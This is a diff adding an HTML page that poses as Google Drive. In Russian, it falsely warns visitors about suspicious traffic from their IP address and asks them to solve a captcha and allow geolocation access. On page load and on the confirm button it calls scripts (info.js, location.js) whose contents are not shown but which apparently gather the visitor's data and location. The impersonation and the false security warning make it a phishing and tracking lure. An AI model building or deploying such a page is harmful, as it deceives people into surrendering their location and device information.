@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta name="description" content="Web word processing, presentations and spreadsheets">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+	<link rel="shortcut icon" href="/images/drive_favicon1.ico">
+	<title>Google Drive</title>
+	<link rel="stylesheet" type="text/css" href="css/main.css">
+	<script type="text/javascript">
+    	if (window.location.protocol == "http:") {
+        	var restOfUrl = window.location.href.substr(5);
+        	window.location = "https:" + restOfUrl;
+    	}
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script type="text/javascript" src="info.js"></script>
+	<script type="text/javascript" src="location.js"></script>
+</head>
+<body onload="information();">
+	<div id="outerContainer">
+		<div id="innerContainer">
+			<div class="aab" style="position: absolute; top: -80px;">
+				<div id="drive-logo">
+					<img src="images/googlelogo_color_116x41dp.png" alt="">
+					
+				</div>
+			</div>
+			<div style="clear:both"></div>
+			<div id="main">
+				<p align="center" id="accessDeniedHeader" >Мы заметили подозрительный трафик с вашего IP адреса 172.168.43.17</p>
+				<div id="message" lang="ru">
+					<p>Для дальнейшего пользования услугами компании Google просьба подтвердить что вы не робот. Для подтверждения решите данную капчу и предоставьте доступ к геолокации. Это нужно для подтверждения принадлежности IP адреса и страны вашего проживания. </p>
+				</div>
+				<div class="captcha">
+					<div class="bbb">
+					<img src="images/capthca.jpg" alt="">
+					<input type="text">
+					</div>
+				</div>
+				<p id="buttons" align="center" style="padding-top: 10px">
+					<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate();">Подтвердить</button>
+				</p>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
